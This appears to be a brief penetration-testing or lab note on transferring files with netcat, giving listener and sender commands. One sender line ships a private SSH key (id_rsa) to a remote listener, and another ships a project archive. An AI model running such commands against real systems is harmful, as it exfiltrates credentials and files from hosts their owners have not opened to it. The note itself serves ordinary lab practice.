
Destination machine:
`nc -lp 12345 > received_filename.ext`
`timeout 2m nc -lp 1234 > received_filename.ext`

Source machine:
`nc 10.18.21.236 12345 < filename_to_send.ext`
`nc 10.10.14.161 12345 < id_rsa`
`nc 10.10.14.161 12345 < project.zip`

check file size to see when finished, then just crtl+c

